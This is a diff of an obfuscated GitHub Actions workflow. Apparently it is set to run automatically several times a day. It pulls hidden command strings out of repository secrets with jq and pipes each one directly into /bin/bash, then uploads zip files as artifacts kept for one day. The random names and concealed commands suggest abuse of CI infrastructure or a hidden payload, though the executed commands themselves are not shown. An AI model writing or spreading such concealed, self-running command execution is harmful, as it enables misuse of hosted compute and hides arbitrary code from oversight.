@@ -1,10 +1,9 @@
 name: antoniobackend48
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '19 0/6 * * *'
 
+  schedule:
+    - cron: '3 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: antoniobackend48
         env:
-          wsouw7461: ${{ secrets.wsouw7461 }}
+          vb033: ${{ secrets.vb033 }}
         run: |
-          echo $wsouw7461 | jq -r .izhps05914 | /bin/bash
-          echo $otzzx9414 | jq -r .asg19 | /bin/bash
-          echo $sn47 | jq -r .zplw5 | /bin/bash
-          echo $bbekb29 | jq -r .m0153 | /bin/bash
-          echo $a93 | jq -r .mxfk16635 | /bin/bash
-          echo $l7 | jq -r .zxx1317 | /bin/bash
-          echo $xk99 | jq -r .aksx9 | /bin/bash
-          echo $aao38180 | jq -r .kla3 | /bin/bash
+          printf '%s' "$vb033" | jq -r .n295 | /bin/bash
+          printf '%s' "$xeqc2" | jq -r .hsiz11080 | /bin/bash
+          printf '%s' "$pdx183" | jq -r .qz5 | /bin/bash
+          printf '%s' "$vx1540" | jq -r .z347 | /bin/bash
+          printf '%s' "$qjib713" | jq -r .p21 | /bin/bash
+          printf '%s' "$hdiid095" | jq -r .tyv5 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: GtDHhkx2
+          path: "*.zip"
+          retention-days: 1
